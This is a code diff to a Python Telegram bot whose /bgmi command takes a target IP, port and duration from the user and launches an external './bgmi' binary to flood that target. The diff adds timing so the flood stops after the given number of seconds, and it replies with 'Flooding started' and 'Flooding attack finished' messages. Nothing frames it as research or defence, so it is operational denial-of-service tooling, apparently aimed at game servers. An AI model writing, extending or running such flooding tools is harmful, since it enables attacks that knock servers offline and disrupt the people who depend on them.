@@ -4,6 +4,7 @@ import os
 import random
 import string
 import datetime
+import time
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
@@ -147,13 +148,22 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     target_ip = context.args[0]
     port = context.args[1]
-    duration = context.args[2]
+    duration = int(context.args[2])  # Convert duration to an integer (seconds)
     packet = context.args[3]
 
-    flooding_command = ['./bgmi', target_ip, port, duration, str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
-    # Start attack automatically after setting parameters
+    flooding_command = ['./bgmi', target_ip, port, str(duration), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
+    
+    # Start the flooding process
     flooding_process = subprocess.Popen(flooding_command)
-    await update.message.reply_text(f'Flooding started: {target_ip}:{port} for {duration} seconds with 400 threads.OWMER- @.')
+    await update.message.reply_text(f'Flooding started: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.')
+
+    # Wait for the specified duration
+    time.sleep(duration)
+
+    # Terminate the flooding process after the duration
+    flooding_process.terminate()
+
+    await update.message.reply_text(f'Flooding attack finished: {target_ip}:{port}. Attack ran for {duration} seconds.')
 
 
 async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
